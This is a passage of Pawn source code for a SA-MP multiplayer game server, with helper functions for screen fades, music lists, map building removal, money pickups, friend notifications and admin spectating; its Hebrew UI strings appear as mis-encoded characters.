		DialogSend(playerid,dialog_enter,DIALOG_STYLE_MSGBOX,string,"Play","News");
		#pragma tabsize 4
	}
	return 1;
}
//=[PlayerDefinedName]==========================================================
stock PlayerDefinedName(playerid) return strlen(playerinfo[playerid][rname]) > 0 && !equal(playerinfo[playerid][rname],"No") && !equal(playerinfo[playerid][rname],"None");
//=[IsEmpty]====================================================================
stock IsEmpty(string[]) return (strlen(string) - charcount(string,' ')) == 0;
//=[TestConnected]==============================================================
stock TestConnected()
{
	for(new i = 0; i < MAX_PLAYERS_; i++) if(!IsPlayerConnected_RealOne(i))
	{
		ResetInfo(i);
		connected[i] = false;
	}
}
//=[PreloadAnimLib]=============================================================
stock PreloadAnimLib(playerid,animlib[]) return ApplyAnimation(playerid,animlib,"null",0.0,0,0,0,0,0);
//=[FoundCrashingChar]==========================================================
stock FoundCrashingChar(text[])
{
    for(new x, j = strlen(text); x < j; x++) if(text[x] != 'Х' &&
	text[x] != '\n' &&
	text[x] != '\t' &&
	text[x] != '\r' &&
    text[x] != '\"' &&
    text[x] != '\'' &&
    text[x] != '\\' &&
    text[x] != '\0' &&
	(text[x] < 32 || text[x] > 126) && !(text[x] > 223 && text[x] < 251))
	{
	    new str[M_S];
	    format(str, M_S, "FoundCrashingChar - Text: %s | Note Pos: %d", text, x);
		Log("Debug", ConsoleID, str);
		return 1;
	}
    return 0;
	//return strfind(text,"╩",true) != -1 || strfind(text,"╥",true) != -1 || strfind(text,"╙",true) != -1 || strfind(text,"╨",true) != -1 || strfind(text,"╤",true) != -1 || strfind(text,"╤",true) != -1;
}
//=[FadeScreen]=================================================================
stock FadeScreen(playerid,r1,g1,b1,a1,r2,g2,b2,a2,steps,hold,param = 0)
{	// by Joe Staff, improved by me
	playerinfo[playerid][sfsteps] = steps;
	new tmpsteps = 0;
	playerinfo[playerid][sfhold] = hold;
	playerinfo[playerid][sfend][0] = r2;
	playerinfo[playerid][sfend][1] = g2;
	playerinfo[playerid][sfend][2] = b2;
	playerinfo[playerid][sfend][3] = a2;
	playerinfo[playerid][sfcur][0] = r1;
	playerinfo[playerid][sfcur][1] = g1;
	playerinfo[playerid][sfcur][2] = b1;
	playerinfo[playerid][sfcur][3] = a1;
	playerinfo[playerid][sfrate][0] = (r1-r2)/steps;
	playerinfo[playerid][sfrate][1] = (g1-g2)/steps;
	playerinfo[playerid][sfrate][2] = (b1-b2)/steps;
	playerinfo[playerid][sfrate][3] = (a1-a2)/steps;
	if(playerinfo[playerid][sfrate][0] != 0) if(((r1-r2)/playerinfo[playerid][sfrate][0]) > steps) tmpsteps = ((r1-r2)/playerinfo[playerid][sfrate][0])-steps;
	if(playerinfo[playerid][sfrate][1] != 0) if(((g1-g2)/playerinfo[playerid][sfrate][1]) > steps+tmpsteps) tmpsteps = ((g1-g2)/playerinfo[playerid][sfrate][1])-steps;
	if(playerinfo[playerid][sfrate][2] != 0) if(((b1-b2)/playerinfo[playerid][sfrate][2]) > steps+tmpsteps) tmpsteps = ((b1-b2)/playerinfo[playerid][sfrate][2])-steps;
	if(playerinfo[playerid][sfrate][3] != 0) if(((a1-a2)/playerinfo[playerid][sfrate][3]) > steps+tmpsteps) tmpsteps = ((a1-a2)/playerinfo[playerid][sfrate][3])-steps;
	if(tmpsteps) playerinfo[playerid][sfsteps] += tmpsteps + 1;
	playerinfo[playerid][sfparam] = param;
	TFO_Add(playerid);
	TFO_Set(playerid,tfo_fade);
	return 1;
}
//=[StopFade]===================================================================
stock StopFade(playerid) return playerinfo[playerid][sfsteps] = 0, playerinfo[playerid][sfhold] = 0, 1;
//=[CurrentlyFading]============================================================
stock CurrentlyFading(playerid) return (_:(playerinfo[playerid][sfsteps] != -1 || playerinfo[playerid][sfhold] != -1));
//=[ReloadMusic]================================================================
forward ReloadMusic();
public ReloadMusic()
{
	for(new i = 0; i < MAX_MUSIC_TYPES; i++) musictype[i][0] = 0;
	for(new i = 0; i < MAX_MUSICS; i++) musicinfo[i][mValid] = 0, musicinfo[i][mFile][0] = 0, musicinfo[i][mType] = -1, musicinfo[i][mName][0] = 0;
	new string[M_S];
	for(new i = 0; i < MAX_MUSIC_TYPES; i++)
	{
		format(string,sizeof(string),"Type%d",i);
		if(fkeyexist(file_music,string)) format(musictype[i],sizeof musictype[],fgetstring(file_music,string));
		else break;
	}
	for(new i = 0; i < MAX_MUSICS; i++)
	{
		format(string,sizeof(string),"Music%d",i);
		if(fkeyexist(file_music,string))
		{
			format(string,sizeof(string),fgetstring(file_music,string));
			Reset2DString(splitted);
			split(string,splitted,'|');
			musicinfo[i][mValid] = 1;
			musicinfo[i][mType] = strval(splitted[0]);
			format(musicinfo[i][mFile],MAX_MUSIC_NAME,strreplace(splitted[1]," ","%20"));
			//strmid(musicinfo[i][mName],splitted[1],0,strfind(splitted[1],".mp"));
			format(musicinfo[i][mName],64,splitted[1]);
			strdel(musicinfo[i][mName],strlen(musicinfo[i][mName])-4,strlen(musicinfo[i][mName]));
		}
		else break;
	}
	return 1;
}
//=[RemoveBuildings]============================================================
stock RemoveBuildings(playerid)
{
	RemoveBuildingForPlayer(playerid,3664,2042.7734,-2442.1875,19.2813,0.25); // LS AP
	RemoveBuildingForPlayer(playerid,2786,0.0,0.0,0.0,6000); // Gambling
	RemoveBuildingForPlayer(playerid,2785,0.0,0.0,0.0,6000); // Gambling
	RemoveBuildingForPlayer(playerid,2188,0.0,0.0,0.0,6000); // Gambling
	RemoveBuildingForPlayer(playerid,1978,0.0,0.0,0.0,6000); // Gambling
	RemoveBuildingForPlayer(playerid,2325,0.0,0.0,0.0,6000); // Gambling
	RemoveBuildingForPlayer(playerid,1895,0.0,0.0,0.0,6000); // Gambling
	RemoveBuildingForPlayer(playerid,3778,609.5469,-1875.0000,5.1406,0.25); // Show
	RemoveBuildingForPlayer(playerid,3778,553.3516,-1875.0000,4.7891,0.25); // Show
	RemoveBuildingForPlayer(playerid,3615,553.3516,-1875.0000,4.7891,0.25); // Show
	RemoveBuildingForPlayer(playerid,3615,609.5469,-1875.0000,5.1406,0.25); // Show
	RemoveBuildingForPlayer(playerid,8977,2001.1406,1555.1016,24.8750,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,3524,2005.4375,1539.8438,13.7266,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,3524,1995.8203,1539.7813,13.7266,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,1503,1998.0078,1544.1953,12.9609,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,8493,2001.1406,1555.1016,24.8750,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,8981,2000.5938,1548.9141,24.4375,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,3524,1996.0469,1549.7422,13.7266,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,9159,2001.1406,1555.1016,24.8750,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid,3524,2005.2344,1549.6719,13.7266,0.25); // Pirate Ship
	RemoveBuildingForPlayer(playerid, 713, 1225.0000, -2258.6563, 8.9453, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 618, 1247.4922, -2107.4766, 55.7500, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 691, 1248.2031, -2089.9531, 56.2500, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 691, 1258.1719, -2081.9297, 55.7891, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 618, 1258.2031, -2095.2813, 56.2422, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 661, 1267.4922, -2110.7656, 54.5547, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 671, 1274.3203, -2111.8359, 53.1328, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 691, 1268.3984, -2092.8047, 55.7891, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 618, 1278.0234, -2098.9531, 53.9297, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 691, 1281.0547, -2114.3672, 52.5313, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 691, 1290.8750, -2042.6094, 55.7891, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 762, 1290.9766, -2025.9375, 60.1875, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 661, 1284.9844, -2020.2500, 57.1563, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 661, 1270.8984, -2000.6563, 57.0469, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 618, 1279.4141, -1998.4766, 56.8125, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 691, 1260.0781, -1995.7813, 55.4609, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 661, 1280.4453, -1992.7422, 54.7188, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 691, 1291.0469, -2007.0703, 54.8828, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 618, 1286.0000, -2000.3984, 55.9766, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 618, 1291.0938, -1997.9922, 53.9453, 0.25); // Extreme 2
	RemoveBuildingForPlayer(playerid, 705, -1815.0547, -11.8594, 14.2266, 0.25); // Extreme 3
	RemoveBuildingForPlayer(playerid, 10893, -1590.4219, 149.1484, 0.0703, 0.25); // Extreme 3
	RemoveBuildingForPlayer(playerid, 10842, -1637.9531, 98.7188, -33.5859, 0.25); // Extreme 3
	RemoveBuildingForPlayer(playerid, 1278, -1505.2031, 146.4844, 16.6172, 0.25); // Extreme 3
	RemoveBuildingForPlayer(playerid, 10828, -1590.4219, 149.1484, 0.0703, 0.25); // Extreme 3
	RemoveBuildingForPlayer(playerid, 11237, -1354.4219, 493.7500, 38.6797, 0.25); // Race
	RemoveBuildingForPlayer(playerid, 10764, -1041.3594, 451.2500, 16.4844, 0.25); // Helicopters Shop
	RemoveBuildingForPlayer(playerid, 18558, -1215.4766, -2348.1094, 9.3516, 0.25); // BoatsDM
	RemoveBuildingForPlayer(playerid, 18559, -1175.4297, -2643.9141, 0.0703, 0.25); // BoatsDM
	RemoveBuildingForPlayer(playerid, 18229, -1175.4297, -2643.9141, 0.0703, 0.25); // BoatsDM
	RemoveBuildingForPlayer(playerid, 18256, -1215.4766, -2348.1094, 9.3516, 0.25); // BoatsDM
	RemoveBuildingForPlayer(playerid, 10286, -1602.0000, 1323.5859, -6.2500, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 759, -1609.3516, 1246.9688, 5.9219, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 759, -1601.4844, 1239.7344, 5.9219, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 759, -1603.6875, 1244.7188, 5.9219, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 715, -1624.8125, 1273.2500, 14.4453, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 759, -1622.3984, 1273.3281, 5.9219, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 759, -1614.3047, 1257.8281, 5.9219, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 715, -1618.6172, 1261.0781, 14.4453, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 759, -1618.2188, 1273.3672, 5.9375, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 715, -1613.8047, 1277.3203, 14.4453, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 759, -1620.3828, 1279.4844, 5.9219, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 10166, -1602.0000, 1323.5859, -6.2500, 0.25); // Docks
	RemoveBuildingForPlayer(playerid, 3489, 1609.3359, 1671.6953, 16.4375, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 3490, 1609.3359, 1671.6953, 16.4375, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 3489, 1677.2969, 1671.6953, 16.4375, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 3490, 1677.2969, 1671.6953, 16.4375, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 8334, 1621.7813, 1316.9922, 13.8203, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 8338, 1641.1328, 1629.4063, 13.8203, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 8340, 1568.0000, 1676.1953, 13.8203, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 8335, 1621.7813, 1316.9922, 13.8203, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 8341, 1568.0000, 1676.1953, 13.8203, 0.25); //AP
	RemoveBuildingForPlayer(playerid, 8339, 1641.1328, 1629.4063, 13.8203, 0.25); //AP
	return 1;
}
//=[ToRCON]=====================================================================
stock ToRCON(col,txt[])
{
	for(new i = 0; i < MAX_PLAYERS_; i++) if(IsPlayerConnected(i) && IsPlayerAdmin(i)) SendClientMessage(i,col,txt);
	print(txt);
}
//=[FileControl]================================================================
/*forward File:my_fopen(const name[], filemode:mode = io_readwrite);
stock File:my_fopen(const name[], filemode:mode = io_readwrite)
{
	if(usingAnyFile)
	{
		if(equal(curFileName,name)) return curFile;
		my_fclose(curFile,true);
	}
	curFile = fopen(name,mode), curFileTickCount = GetTickCount(), usingAnyFile = true;
	format(curFileName,sizeof(curFileName),name);
	return curFile;
}
forward bool:my_fclose(File:handle,bool:ro=false);
stock bool:my_fclose(File:handle,bool:ro=false) return ro ? fclose(handle) : true;*/
//=[urlencode]==================================================================
stock urlencode(string[])
{	// by DracoBlue, improved by me
	new ret[M_S], i = 0, p = 0, s = 0;
	ret[0] = 0;
	while(string[i] != 0)
	{
		if((string[i] >= 'A' && string[i] <='Z')
		|| (string[i] >= 'a' && string[i] <='z')
		|| (string[i] >= '0' && string[i] <='9')
		|| string[i] == '-' || string[i] == '_' || string[i] == '.' || string[i] == '/') ret[p] = string[i];
		else
		{
			ret[p] = '%';
			p++;
			s = (string[i] % 16);
			ret[p+1] = (s > 9) ? (55 + s) : (48 + s);
			s = floatround((string[i] - s) / 16);
			ret[p] = (s > 9) ? (55 + s) : (48 + s);
			p++;
		}
		p++, i++;
	}
	return ret;
}
//=[SetPlayerCP]================================================================
stock SetPlayerCP(playerid,Float:x,Float:y,Float:z,Float:size)
{
	playerinfo[playerid][specp] = 1;
	DisablePlayerCheckpoint(playerid);
	return SetPlayerCheckpoint(playerid,x,y,z,size);
}
//=[RefreshGProperties]=========================================================
stock RefreshGProperties()
{
	for(new i = 0; i < MAX_GPROPERTIES; i++) if(gproperties[i][gpValid]) switch(gproperties[i][gpType])
	{
		case gptype_int: setproperty(.name=gproperties[i][gpName],.value=strval(gproperties[i][gpValue]));
		case gptype_str: setproperty(.value=hash(gproperties[i][gpName]),.string=gproperties[i][gpValue]);
	}
	return 1;
}
//=[ResetGProperties]===========================================================
stock ResetGProperties()
{
	for(new i = 0; i < MAX_GPROPERTIES; i++) if(gproperties[i][gpValid]) switch(gproperties[i][gpType])
	{
		case gptype_int: deleteproperty(.name=gproperties[i][gpName]);
		case gptype_str: deleteproperty(.value=hash(gproperties[i][gpName]));
	}
	return 1;
}
//=[TickGProperties]============================================================
stock TickGProperties()
{
	for(new i = 0; i < MAX_GPROPERTIES; i++) if(gproperties[i][gpValid] && gproperties[i][gpDuration] > 0)
	{
		gproperties[i][gpDuration]--;
		if(!gproperties[i][gpDuration])
		{
			switch(gproperties[i][gpType])
			{
				case gptype_int: deleteproperty(.name=gproperties[i][gpName]);
				case gptype_str: deleteproperty(.value=hash(gproperties[i][gpName]));
			}
			gproperties[i][gpValid] = 0;
			format(gproperties[i][gpName],64,"");
			format(gproperties[i][gpValue],64,"");
			gproperties[i][gpType] = gptype_null;
		}
	}
	return 1;
}
//=[TickProperties]=============================================================
stock TickProperties()
{
	new m = GetSVarsUpperIndex(), k[64], f = -1;
	for(new i = m; i >= 0; i--)
	{
		GetSVarNameAtIndex(i,k,sizeof(k));
		if(strlen(k) > 0) if((f = strfind(k,"_duration",true)) != -1)
		{
			DeleteSVar(k);
			strdel(k,f,strlen(k));
			DeleteSVar(k);
		}
	}
	return 1;
}
//=[CreateMoneyPickup]==========================================================
stock CreateMoneyPickup(Float:x,Float:y,Float:z,world,amount)
{
	new id = CreatePickupEx(1212,1,x,y,z,28,world,amount), flag = moneyPickup[nextMoneyPickup] == -1 ? nextMoneyPickup : -1, stopsearching = 0;
	nextMoneyPickup = -1, moneyPickups = -1;
	for(new i = 0; i < sizeof(moneyPickup) && (nextMoneyPickup == -1 || stopsearching < 20); i++)
	{
		if(moneyPickup[i] == -1)
		{
			if(flag == -1) flag = i; else nextMoneyPickup = i;
			stopsearching++;
		}
  		if(moneyPickup[i] != -1) stopsearching = 0;
	}
	if(moneyPickups >= flag || moneyPickups == -1) moneyPickups = flag + 1;
	//new str[128]; format(str, sizeof(str), "[CREATED]: [ID: %d]", id), SendClientMessageToAll(green, str);
 	moneyPickup[flag] = id, moneyPickupTime[flag] = amount >= 10000 ? 60 : 30;
 	pickupinfo[id][moneypickup] = flag;
	return 1;
}
//=[DestroyMoneyPickup]=========================================================
stock DestroyMoneyPickup(id)
{
	nextMoneyPickup = id;
	if(id == moneyPickups-1) for(new i = id; i >= 0 && moneyPickups == id; i--) if(moneyPickup[i] != -1) moneyPickups = i + 1;
	DestroyPickupEx(moneyPickup[id]);
	moneyPickup[id] = -1, moneyPickupTime[id] = -1;
	return 1;
}
//=[ResetAttachedObjects]=======================================================
stock ResetAttachedObjects(playerid) for(new i = 0; i < MAX_PLAYER_ATTACHED_OBJECTS; i++) if(IsPlayerAttachedObjectSlotUsed(playerid,i)) RemovePlayerAttachedObject(playerid,i);
//=[RefreshClothes]=============================================================
stock RefreshClothes(playerid)
{
	if(playerinfo[playerid][clothes] > -1) SetPlayerAttachedObject(playerid,aoslot_clothes,Clothes[playerinfo[playerid][clothes]][cltModel],Clothes[playerinfo[playerid][clothes]][cltBone],playerinfo[playerid][clothesp][0],playerinfo[playerid][clothesp][1],playerinfo[playerid][clothesp][2],playerinfo[playerid][clothesp][3],playerinfo[playerid][clothesp][4],playerinfo[playerid][clothesp][5]);
	else if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_clothes)) RemovePlayerAttachedObject(playerid,aoslot_clothes);
	if(playerinfo[playerid][clothes2] > -1) SetPlayerAttachedObject(playerid,aoslot_clothes2,Clothes[playerinfo[playerid][clothes2]][cltModel],Clothes[playerinfo[playerid][clothes2]][cltBone],playerinfo[playerid][clothes2p][0],playerinfo[playerid][clothes2p][1],playerinfo[playerid][clothes2p][2],playerinfo[playerid][clothes2p][3],playerinfo[playerid][clothes2p][4],playerinfo[playerid][clothes2p][5]);
	else if(IsPlayerAttachedObjectSlotUsed(playerid,aoslot_clothes2)) RemovePlayerAttachedObject(playerid,aoslot_clothes2);
}
//=[GetFriends]=================================================================
stock GetFriends(playerid,&cv)
{
	new returnedArray[MAX_FRIENDS] = {INVALID_PLAYER_ID,...}, pvarname[32], pvarvalue[MAX_PLAYER_NAME], c = 0;
	for(new i = 1; i <= MAX_FRIENDS; i++)
	{
		format(pvarname,sizeof(pvarname),"Friend_%d",i);
		GetPVarString(playerid,pvarname,pvarvalue,sizeof(pvarvalue));
		returnedArray[c] = INVALID_PLAYER_ID;
		if(!equal(pvarvalue,"None"))
		{
			for(new j = 0; j < MAX_PLAYERS_ && returnedArray[c] == INVALID_PLAYER_ID; j++) if(IsPlayerConnected(j) && equal(GetName(j),pvarvalue)) returnedArray[c] = j;
			if(returnedArray[c] != INVALID_PLAYER_ID) c++;
		}
	}
	return cv = c, returnedArray;
}
//=[GoFriendMessage]============================================================
stock GoFriendMessage(playerid,msg)
{
	new list[MAX_FRIENDS], list2[MAX_PLAYERS], foundThere[MAX_PLAYERS] = {INVALID_PLAYER_ID,...}, c[3] = {0,0,0}, string[M_S];
	list = GetFriends(playerid,c[0]);
	switch(msg)
	{
		case 0: // tele
		{
			for(new i = 0; i < c[0]; i++) if(!playerinfo[list[i]][fmsg][msg])
			{
				list2 = GetFriends(list[i],c[1]), c[2] = 0;
				for(new j = 0; j < c[1]; j++) if(GetPlayerTeleportArea(list2[j]) == playerinfo[playerid][fmsgparam] && PlayerDefinedName(list2[j])) foundThere[c[2]++] = list2[j];
				if(c[2] >= 2)
				{
					format(string,sizeof(string)," Х %s ?",Teleports[playerinfo[playerid][fmsgparam]][Tcmd]);
					switch(c[2])
					{
						case 2: format(string,sizeof(string),"%s∙Ёщщэ юфчс°щэ ∙ьъ, %s х-%s",string,playerinfo[foundThere[0]][rname],playerinfo[foundThere[1]][rname]);
						case 3: format(string,sizeof(string),"%s∙ьх∙ф юфчс°щэ ∙ьъ, %s, %s х-%s",string,playerinfo[foundThere[0]][rname],playerinfo[foundThere[1]][rname],playerinfo[foundThere[2]][rname]);
						default: format(string,sizeof(string),"%sы-%d юфчс°щэ ∙ьъ, сщЁщфэ %s, %s х-%s",string,c[2],playerinfo[foundThere[0]][rname],playerinfo[foundThere[1]][rname],playerinfo[foundThere[2]][rname]);
					}
					format(string,sizeof(string),"%s ЁюЎрх ю∙чўщэ ы°тЄ срх·х ∙щтх°. рхьщ ·°Ўф ьфЎш°є",string);
					SendClientMessage(list[i],orange,string);
				}
				playerinfo[list[i]][fmsg][msg] = 300;
			}
		}
		case 1: // dm zones
		{
			for(new i = 0; i < c[0]; i++) if(!playerinfo[list[i]][fmsg][msg])
			{
				list2 = GetFriends(list[i],c[1]), c[2] = 0;
				for(new j = 0; j < c[1]; j++) if(playerinfo[list2[j]][dmzone] != dmz_none && playerinfo[list2[j]][dmzone] == playerinfo[playerid][fmsgparam] && PlayerDefinedName(list2[j])) foundThere[c[2]++] = list2[j];
				if(c[2] >= 2)
				{
					format(string,sizeof(string)," Х %s ?",DMZs[playerinfo[playerid][fmsgparam]][dmzCmd]);
					switch(c[2])
					{
						case 2: format(string,sizeof(string),"%s∙Ёщщэ юфчс°щэ ∙ьъ, %s х-%s",string,playerinfo[foundThere[0]][rname],playerinfo[foundThere[1]][rname]);
						case 3: format(string,sizeof(string),"%s∙ьх∙ф юфчс°щэ ∙ьъ, %s, %s х-%s",string,playerinfo[foundThere[0]][rname],playerinfo[foundThere[1]][rname],playerinfo[foundThere[2]][rname]);
						default: format(string,sizeof(string),"%sы-%d юфчс°щэ ∙ьъ, сщЁщфэ %s, %s х-%s",string,c[2],playerinfo[foundThere[0]][rname],playerinfo[foundThere[1]][rname],playerinfo[foundThere[2]][rname]);
					}
					format(string,sizeof(string),"%s ЁюЎрх ю∙чўщэ ы°тЄ срх·х рцх° ущ-рэ. рхьщ ·°Ўф ьфЎш°є",string);
					SendClientMessage(list[i],orange,string);
				}
				playerinfo[list[i]][fmsg][msg] = 300;
			}
		}
	}
}
//=[GetSettingName]=============================================================
stock GetSettingName(playerid,num,num2,keyname = 0)
{
	new ret[64];
	switch(num)
	{
		case 0: if(keyname) ret = "юЎс"; else switch(num2)
		{
			case 0: ret = "ььр °ыс";
			case 1: ret = "Єэ °ыс";
		}
		case 1: if(keyname) ret = "чщщэ"; else switch(num2)
		{
			case 0: ret = "ььр ∙щЁхщ счщщэ рх сютя";
			case 1: ret = "чщщэ юьрщэ ььр ютя";
			case 2: ret = "чщщэ хютя юьрщэ";
			case 3: ret = "чЎщ чщщэ ььр ютя";
			case 4: ret = "(юЎс тёщёф (рчхц чщщэ рчу";
		}
		case 2: if(keyname) ret = "Ё∙ўщэ"; else switch(num2)
		{
			case -1: ret = "рщЇхё Ё∙ўщэ";
			case 0: ret = "ььр ∙щЁхщ сЁ∙ўщэ";
			case 1..46: format(ret,sizeof(ret),WeaponName(playerinfo[playerid][getsetting][num2]));
		}
		case 3: if(keyname) ret = "ющўхэ"; else switch(num2)
		{
			case 0: ret = "юхьъ";
			case 1: ret = "юрчх°щъ";
			case 2: ret = "юЄьщъ";
			case 3: ret = "ю·ч·щъ";
			case 4: ret = "рў°рщ с°ущхё 10 юёсщсъ";
			case 5: ret = "рў°рщ с°ущхё 25 юёсщсъ";
			case 6: ret = "рў°рщ с°ущхё 50 юёсщсъ";
		}
		case 4: if(keyname) ret = "фўЇрф"; else switch(num2)
		{
			case 0: ret = "ььр";
			case 1: ret = "ющу ьрч° ф∙щтх°";
		}
	}
	return ret;
}
//=[GetSettingItemsCount]=======================================================
stock GetSettingItemsCount(countype,num=0)
{
	if(!countype) return 5;
	switch(num)
	{
		case 0: return countype > 0 ? 2 : 0;
		case 1: return countype > 0 ? 5 : 0;
		case 2: return countype > 0 ? 47 : -1;
		case 3: return countype > 0 ? 7 : 0;
		case 4: return countype > 0 ? 2 : 0;
	}
	return 0;
}
//=[AdminSpecOff]===============================================================
stock AdminSpecOff(playerid)
{
	TogglePlayerSpectating(playerid,0);
	playerinfo[playerid][spectate] = -1, playerinfo[playerid][specbuttons] = false;
	CancelSelectTextDraw(playerid);
	for(new j = 0; j < sizeof(spectext); j++) TextDrawHideForPlayer(playerid,spectext[j]);
	AdminSpecText(playerid,'d');
}
//=[AdminSpecText]==============================================================
stock AdminSpecText(playerid,act)
{
	switch(act)
	{
		case 'c', 'u':
		{
			new str[128], Float:h[3], spd[16];
			GetPlayerHealth(playerinfo[playerid][spectate],h[0]);
			GetPlayerArmour(playerinfo[playerid][spectate],h[1]);
			if(playerinfo[playerinfo[playerid][spectate]][pkmh] > 800) spd = "Teleporting";
			else format(spd,sizeof(spd),"%03d kmh",playerinfo[playerinfo[playerid][spectate]][pkmh]);
			format(str,sizeof(str),"~w~Health: ~b~%.0f~w~, Armour: ~b~%.0f~n~~w~Speed: ~b~%s",h[0],h[1],spd);
			if(IsPlayerInAnyVehicle(playerinfo[playerid][spectate]))
			{
				GetVehicleHealth(GetPlayerVehicleID(playerinfo[playerid][spectate]),h[2]);
				format(str,sizeof(str),"%s~w~, VHealth: ~b~%.0f",str,h[2]);
			}
			format(str,sizeof(str),"%s~n~Ping: ~g~%d",str,GetPlayerPing(playerinfo[playerid][spectate]));
			if(act == 'c')
			{
			    PlayerTextDrawDestroy(playerid, playerinfo[playerid][specutext]);
				playerinfo[playerid][specutext] = CreatePlayerTextDraw(playerid,143.000000,377.000000,str);
				//PlayerTextDrawBackgroundColor(playerid,playerinfo[playerid][specutext],255);
				PlayerTextDrawFont(playerid,playerinfo[playerid][specutext],1);
				PlayerTextDrawLetterSize(playerid,playerinfo[playerid][specutext],0.500000,1.800000);
				PlayerTextDrawColor(playerid,playerinfo[playerid][specutext],-1);
				PlayerTextDrawSetOutline(playerid,playerinfo[playerid][specutext],0);
				PlayerTextDrawSetShadow(playerid,playerinfo[playerid][specutext],1);
				PlayerTextDrawShow(playerid,playerinfo[playerid][specutext]);
				PlayerTextDrawTextSize(playerid, playerinfo[playerid][specutext], 1.100000,1.300000);
			}
			else PlayerTextDrawSetString(playerid,playerinfo[playerid][specutext],str);
		}
		case 'd':
		{
			PlayerTextDrawHide(playerid,playerinfo[playerid][specutext]);
			PlayerTextDrawDestroy(playerid,playerinfo[playerid][specutext]);
		}
	}
}
//=[SendShowInfo]===============================================================
stock SendShowInfo(playerid,showid,senditas)
{
	new fullinfo[450];
	format(fullinfo,sizeof(fullinfo),@c(lightred) "∙э ффхЇЄф\n" @c(white) "%s",showinfo[showid][shwName]);
	format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "юёЇ° ёщух°щ\n" @c(white) "%d",fullinfo,showid);
	format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "щхЎ°\n" @c(white) "%s",fullinfo,showinfo[showid][shwAuthor]);
	format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "сщЎхЄ\n" @c(white) "%s",fullinfo,showinfo[showid][shwSinger]);
	format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "ючщ° ы°шщё\n" @c(white) "%d$",fullinfo,showinfo[showid][shwCost]);
	format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "рх°ъ\n" @c(white) "%02d:%02d",fullinfo,showinfo[showid][shwLength][0],showinfo[showid][shwLength][1]);
	if(currentShow[0] == showid)
	{
		if(currentShow[1] == -1) format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "цюя ∙Єс° юффхЇЄф фЁхычщ·\n" @c(white) "ффхЇЄф Єху ьр ф·чщьф",fullinfo);
		else format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "цюя ∙Єс° юффхЇЄф фЁхычщ·\n" @c(white) "%02d:%02d",fullinfo,currentShow[1]/60,currentShow[1]%60);
	}
	switch(senditas)
	{
		case dialog_show: ShowPlayerDialog(playerid,senditas,DIALOG_STYLE_MSGBOX,@c(lightblue) "ыЁщёф ьфхЇЄф",fullinfo,"ыЁщёф","сщшхь");
		case dialog_showinfo: ShowPlayerDialog(playerid,senditas,DIALOG_STYLE_MSGBOX,@c(lightblue) "ющуЄ Єь фхЇЄф",fullinfo,"чцх°","ётх°");
		case dialog_ni: ShowPlayerDialog(playerid,senditas,DIALOG_STYLE_MSGBOX,@c(lightblue) "ющуЄ Єь фхЇЄф",fullinfo,"ётх°","");
	}
}
//=[ExecuteShowCommand]=========================================================
stock ExecuteShowCommand(cmd[],params[])
{
	/* Available Commands:
	audio;url,x,y,z
	npc;identity,name,skin,x,y,z,angle
	delnpc;identity
	editnpc;identity,skin,x,y,z,angle
	weapon;identity,wid
	resetweapon;identity
	rotate;identity,angle
	dance;identity,danceid
	anim;identity,animlib,animname,loop,lockx,locky,freeze,time
	animall;animlib,animname,loop,lockx,locky,freeze,time
	attach;identity,slot,model,bone,x,y,z,rx,ry,rz,sx,sy,sz
	rattach;identity,slot
	say;identity,color,text
	object;model,x,y,z,rx,ry,rz,duration
	mobject;model,x,y,z,rx,ry,rz,nx,ny,nz,nrx,nry,nrz,speed,duration
	boom;expid,x,y,z,shake
	health;amount
